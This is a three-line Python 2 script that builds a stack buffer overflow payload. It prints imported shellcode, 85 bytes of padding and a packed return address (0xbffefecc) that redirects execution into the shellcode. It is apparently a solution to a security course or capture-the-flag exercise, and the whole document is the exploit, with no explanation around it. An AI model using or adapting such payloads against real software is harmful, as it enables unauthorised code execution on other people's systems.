from shellcode import shellcode
from struct import pack

print shellcode + "a"*85 + pack("<I", 0xbffefecc)